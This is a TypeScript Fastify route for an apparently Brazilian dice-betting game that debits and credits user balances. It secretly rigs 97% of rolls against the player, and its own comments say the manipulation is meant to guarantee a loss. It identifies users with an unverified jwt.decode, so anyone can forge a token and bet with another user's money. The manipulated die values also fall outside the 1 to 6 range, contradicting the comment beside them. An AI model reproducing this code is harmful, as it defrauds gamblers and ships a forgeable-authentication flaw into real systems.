import { PrismaClient } from "@prisma/client";
import { FastifyReply, FastifyRequest } from "fastify";
import jwt, { JwtPayload } from "jsonwebtoken";

const prisma = new PrismaClient();

export default async function Uoseven(req: FastifyRequest, res: FastifyReply) {
  const { a, b, c } = req.body as { a: string; b: number; c: string };

  if (!a || !b || !c) {
    return res
      .status(400)
      .send({ message: "Alguma variável não foi definida" });
  }

  try {
    const decoded = jwt.decode(a) as JwtPayload | null;
    if (!decoded || !decoded.email) {
      return res
        .status(400)
        .send({ message: "Email não encontrado no token." });
    }

    const email = String(decoded.email);
    const user = await prisma.user.findUnique({
      where: { email },
      include: { recharges: { orderBy: { createdAt: "desc" } } },
    });

    if (!user) {
      return res.status(404).send({ message: "Usuário não encontrado." });
    }

    if (b < 0.5) {
      return res.status(400).send({ message: "Minimo para aposta: R$0.50!" });
    }

    if (user.balance < b) {
      return res
        .status(200)
        .send({ message: "Saldo menor que valor de aposta!", d1: 1, d2: 1 });
    }

    try {
      let d1, d2, diceSum;
      let newBalance = user.balance - b;
      let message = "Perda!";
      const chanceManipulacao = Math.random() < 0.97; // 97% de chance de manipulação

      if (chanceManipulacao) {
        // Manipula os dados para garantir que o jogador perca
        if (c === "under") {
          d1 = Math.floor(Math.random() * 3) + 7; // Gera valores entre 4 e 6
          d2 = Math.floor(Math.random() * 6) + 1; // Normal
        } else if (c === "over") {
          d1 = Math.floor(Math.random() * 3) + 3; // Gera valores entre 1 e 3
          d2 = Math.floor(Math.random() * 6) + 1; // Normal
        } else if (c === "equal") {
          do {
            d1 = Math.floor(Math.random() * 6) + 1;
            d2 = Math.floor(Math.random() * 6) + 1;
          } while (d1 + d2 === 7); // Garante que não seja igual a 7
        }
      } else {
        // Gera os dados normalmente
        d1 = Math.floor(Math.random() * 6) + 1;
        d2 = Math.floor(Math.random() * 6) + 1;
      }
      if (d1 === undefined || d2 === undefined) {
        return res.status(500).send({
          message: "Erro ao realizar soma dos valores dos dados, undefined!",
        });
      }
      diceSum = d1 + d2;

      // Verifica se o usuário ganhou ou perdeu
      if (c === "under" && diceSum < 7) {
        newBalance = user.balance + b * 1.92;
        message = "Ganho!";
      } else if (c === "over" && diceSum > 7) {
        newBalance = user.balance + b * 1.92;
        message = "Ganho!";
      } else if (c === "equal" && diceSum === 7) {
        newBalance = user.balance + b * 8.7;
        message = "Ganho!";
      }

      // Atualiza saldo do usuário
      await prisma.user.update({
        data: { balance: newBalance },
        where: { email },
      });

      return res.status(200).send({ message, d1, d2, balance: newBalance });
    } catch (error) {
      return res
        .status(500)
        .send({ message: "Erro ao atualizar saldo do usuário" });
    }
  } catch (error) {
    return res.status(500).send({ message: "Erro interno do servidor" });
  }
}
